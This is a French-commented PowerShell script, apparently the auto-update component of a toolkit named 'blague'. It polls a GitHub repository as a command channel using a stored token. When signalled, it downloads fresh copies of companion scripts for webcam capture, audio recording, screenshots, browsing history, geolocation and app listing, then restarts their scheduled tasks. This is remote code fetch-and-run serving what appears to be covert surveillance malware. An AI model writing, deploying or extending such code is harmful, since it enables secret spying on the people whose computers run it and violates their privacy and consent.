# blague_update_windows.ps1
# Surveille GitHub. Quand update=true -> telecharge la derniere version de tous les scripts -> redémarre.

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

$SCRIPTS = @(
    "blague_lock_windows.ps1",
    "blague_webcam_windows.ps1",
    "blague_listing_windows.ps1",
    "blague_audio_windows.ps1",
    "blague_historique_windows.ps1",
    "blague_screenshot_windows.ps1",
    "blague_localisation_windows.ps1",
    "blague_apps_windows.ps1",
    "blague_update_windows.ps1",
    "blague_signature_windows.py"
)

function Get-UpdateSignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_update.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ update = [bool]$data.update; sha = $resp.sha }
    } catch { return $null }
}

function Reset-UpdateSignal($sha) {
    try {
        $body = @{
            message = "reset update signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"update":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_update.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Update-Scripts {
    $base = "https://raw.githubusercontent.com/$($config.owner)/$($config.repo)/$($config.branch)/tools"
    foreach ($script in $SCRIPTS) {
        try {
            $dest = Join-Path $PSScriptRoot $script
            Invoke-WebRequest "$base/$script" -OutFile $dest -ErrorAction Stop
        } catch {}
    }
}

# Boucle principale
while ($true) {
    $signal = Get-UpdateSignal
    if ($signal -and $signal.update) {
        Reset-UpdateSignal $signal.sha
        Update-Scripts
        # Redemarrer toutes les taches planifiees pour charger les nouveaux scripts
        $taches = @("BlagueVerrou","BlagueWebcam","BloagueListing","BlagueAudio",
                    "BlagueHistorique","BlagueScreenshot","BlagueLocalisation","BlagueApps","BlagueSignature")
        foreach ($t in $taches) {
            schtasks /end /tn $t 2>$null
            Start-Sleep -Milliseconds 500
            schtasks /run /tn $t 2>$null
        }
    }
    Start-Sleep -Seconds 10
}
